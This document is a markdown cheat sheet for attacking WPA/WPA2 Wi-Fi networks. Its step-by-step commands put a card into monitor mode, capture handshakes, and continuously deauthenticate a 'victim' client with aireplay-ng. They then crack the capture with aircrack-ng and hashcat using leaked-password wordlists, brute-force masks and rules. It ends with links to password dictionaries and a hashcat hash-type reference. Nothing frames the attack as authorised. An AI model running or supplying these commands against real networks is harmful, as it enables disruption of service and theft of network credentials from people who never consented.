# Verify that airmon-ng has no issues:
```
sudo airmon-ng check 
```
# Kill any issues with using airmon-ng:
```
sudo airmon-ng check kill
```
# Find Network Interface Cards:
"ip addr" or "ifconfig"

#  Start airmon-ng on interface:
```
sudo airmon-ng start wlp1s0
```
# Start monitor mode on interface:
```
sudo airodump-ng wlp1s0mon
```
# Save packets from airodump:
### sudo airodump-ng -w [Save to this File Name] -c [Channel#] [Interface]
```
sudo airodump-ng -w New -c 2 wlp1s0mon
```
### sudo airodump-ng -c [Channel#] --bssid [bssid MAC] -w [Save to this File Name] [Interface]
```
sudo airodump-ng -c 4 --bssid 00:00:00:00:00:00 -w New  wlp1s0mon
```
**wait for "WPA handshake" to show up in the top right corner**

# Deauthenticating Device from the network
```
aireplay-ng -0 0 -a <AP-MAC> -c <Victim-Mac> wlan0mon
```
Command instructions:
```
-0 means deauthentication.
 0 is the number of deauths to send 0 means send them continuously, you can send 10 if you want the target to disconnect and reconnect.
-a 50:C7:BF:DC:4C:E8 is the MAC address of the access point we are targeting.
-c E0:B5:2D:EA:18:A7 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated.
wlan0mon is the interface name.
```


# Stop monitor mode on interface:
```
sudo airmon-ng stop wlp1s0mon
```
# Start Network Manager so you can get back online:
```
sudo service network-manager start
```
# Use aircrack and passwordlist of your choice:
### sudo aircrack-ng -w [Password list] [Name of CAP file] 
```
sudo aircrack-ng -w ~/github/ChickenManGame/ChickenDay/passwords/darkweb2017-top10000.txt New-01.cap 
```
### sudo aircrack-ng -a2 specifies WPA2, -b is the bssid, -w is the wordfile
```
sudo aircrack-ng -a2 -b 60:38:E0:D3:AC:45 -w ~/passwords2.txt New-01.cap 
sudo aircrack-ng -a2 -w ~/new-list2.txt New-01.cap 
```


# clean up cap to convert
```
wpaclean clean.cap original.cap 
```
# convert to use hashcat 
### make hccapx
```
aircrack-ng -j clean clean.cap
```
### make hccap
```
aircrack-ng -J clean clean.cap
```

# Dictionaries:
1. https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
2. https://wiki.skullsecurity.org/Passwords
3. https://haveibeenpwned.com/Passwords

# Hashcat
### Dictionary Attack
```
hashcat -m 2500 capture.hccapx wordlist.txt
```
### Brute-Force Attack
```
hashcat -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
hashcat -m 2500 -a3 capture.hccapx ?h?h?h?h?h?h?h?h
hashcat -m 2500 -a3 capture.hccapx ?H?H?H?H?H?H?H?H
```
### Rule Based Attack
```
hashcat -m 2500 -r rules/best64.rule capture.hccapx wordlist.txt
```
# Hashcat Help Info:
```
       -b, --benchmark
              Run benchmark
       -m, --hash-type=NUM
              Hash-type, see references below
       -a, --attack-mode=NUM
              Attack-mode, see references below
       --status
              Enable automatic update of the status-screen
       -o, --outfile=FILE
              Define outfile for recovered hash
       --show 
	      Show cracked passwords only (see --username)
       --left 
	      Show uncracked passwords only (see --username)
       --username
              Enable ignoring of usernames in hashfile (Recommended: also use --show)
       --remove
              Enable remove of hash once it is cracked
       -r, --rules-file=FILE
              Rules-file use: -r 1.rule
       --force
              Ignore warnings
```
Built-in charsets:
```
       ?l = abcdefghijklmnopqrstuvwxyz
       ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
       ?d = 0123456789
       ?h = 0123456789abcdef
       ?H = 0123456789ABCDEF
       ?s =  !"#$%&'()*+,-./:;<=>?@[]^_`{|}~
       ?a = ?l?u?d?s
       ?b = 0x00 - 0xff
```
Attack mode:
```
       0 = Straight
       1 = Combination
       3 = Brute-force
       6 = Hybrid Wordlist + Mask
       7 = Hybrid Mask + Wordlist
```
Hash types:
```
       0 = MD5
       10 = md5($pass.$salt)
       20 = md5($salt.$pass)
       30 = md5(unicode($pass).$salt)
       40 = md5($salt.unicode($pass))
       50 = HMAC-MD5 (key = $pass)
       60 = HMAC-MD5 (key = $salt)
       100 = SHA1
       110 = sha1($pass.$salt)
       120 = sha1($salt.$pass)
       130 = sha1(unicode($pass).$salt)
       140 = sha1($salt.unicode($pass))
       150 = HMAC-SHA1 (key = $pass)
       160 = HMAC-SHA1 (key = $salt)
       200 = MySQL323
       300 = MySQL4.1/MySQL5
       400 = phpass, MD5(Wordpress), MD5(phpBB3), MD5(Joomla)
       500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5
       900 = MD4
       1000 = NTLM
       1100 = Domain Cached Credentials (DCC), MS Cache
       1400 = SHA256
       1410 = sha256($pass.$salt)
       1420 = sha256($salt.$pass)
       1430 = sha256(unicode($pass).$salt)
       1431 = base64(sha256(unicode($pass)))
       1440 = sha256($salt.unicode($pass))
       1450 = HMAC-SHA256 (key = $pass)
       1460 = HMAC-SHA256 (key = $salt)
       1600 = md5apr1, MD5(APR), Apache MD5
       1700 = SHA512
       1710 = sha512($pass.$salt)
       1720 = sha512($salt.$pass)
       1730 = sha512(unicode($pass).$salt)
       1740 = sha512($salt.unicode($pass))
       1750 = HMAC-SHA512 (key = $pass)
       1760 = HMAC-SHA512 (key = $salt)
       1800 = SHA-512(Unix)
       2400 = Cisco-PIX MD5
       2410 = Cisco-ASA MD5
       2500 = WPA/WPA2
       2600 = Double MD5
       3200 = bcrypt, Blowfish(OpenBSD)
       3300 = MD5(Sun)
       3500 = md5(md5(md5($pass)))
       3610 = md5(md5($salt).$pass)
       3710 = md5($salt.md5($pass))
       3720 = md5($pass.md5($salt))
       3800 = md5($salt.$pass.$salt)
       3910 = md5(md5($pass).md5($salt))
       4010 = md5($salt.md5($salt.$pass))
       4110 = md5($salt.md5($pass.$salt))
       4210 = md5($username.0.$pass)
       4300 = md5(strtoupper(md5($pass)))
       4400 = md5(sha1($pass))
       4500 = Double SHA1
       4600 = sha1(sha1(sha1($pass)))
       4700 = sha1(md5($pass))
       4800 = MD5(Chap), iSCSI CHAP authentication
       4900 = sha1($salt.$pass.$salt)
       5000 = SHA-3(Keccak)
       5100 = Half MD5
       5200 = Password Safe SHA-256
       5300 = IKE-PSK MD5
       5400 = IKE-PSK SHA1
       5500 = NetNTLMv1-VANILLA / NetNTLMv1-ESS
       5600 = NetNTLMv2
       5700 = Cisco-IOS SHA256
       5800 = Android PIN
       6300 = AIX {smd5}
       6400 = AIX {ssha256}
       6500 = AIX {ssha512}
       6700 = AIX {ssha1}
       6900 = GOST, GOST R 34.11-94
       7000 = Fortigate (FortiOS)
       7100 = OS X v10.8+
       7200 = GRUB 2
       7300 = IPMI2 RAKP HMAC-SHA1
       7400 = sha256crypt, SHA256(Unix)
       7900 = Drupal7
       8400 = WBB3, Woltlab Burning Board 3
       8900 = scrypt
       9200 = Cisco $8$
       9300 = Cisco $9$
       9800 = Radmin2
       10000 = Django (PBKDF2-SHA256)
       10200 = Cram MD5
       10300 = SAP CODVN H (PWDSALTEDHASH) iSSHA-1
       11000 = PrestaShop
       11100 = PostgreSQL Challenge-Response Authentication (MD5)
       11200 = MySQL Challenge-Response Authentication (SHA1)
       11400 = SIP digest authentication (MD5)
       99999 = Plaintext
```
Specific hash type:
```
       11 = Joomla < 2.5.18
       12 = PostgreSQL
       21 = osCommerce, xt:Commerce
       23 = Skype
       101 = nsldap, SHA-1(Base64), Netscape LDAP SHA
       111 = nsldaps, SSHA-1(Base64), Netscape LDAP SSHA
       112 = Oracle S: Type (Oracle 11+)
       121 = SMF > v1.1
       122 = OS X v10.4, v10.5, v10.6
       123 = EPi
       124 = Django (SHA-1)
       131 = MSSQL(2000)
       132 = MSSQL(2005)
       133 = PeopleSoft
       141 = EPiServer 6.x < v4
       1421 = hMailServer
       1441 = EPiServer 6.x > v4
       1711 = SSHA-512(Base64), LDAP {SSHA512}
       1722 = OS X v10.7
       1731 = MSSQL(2012 & 2014)
       2611 = vBulletin < v3.8.5
       2612 = PHPS
       2711 = vBulletin > v3.8.5
       2811 = IPB2+, MyBB1.2+
       3711 = Mediawiki B type
       3721 = WebEdition CMS
       7600 = Redmine Project Management Web App
```
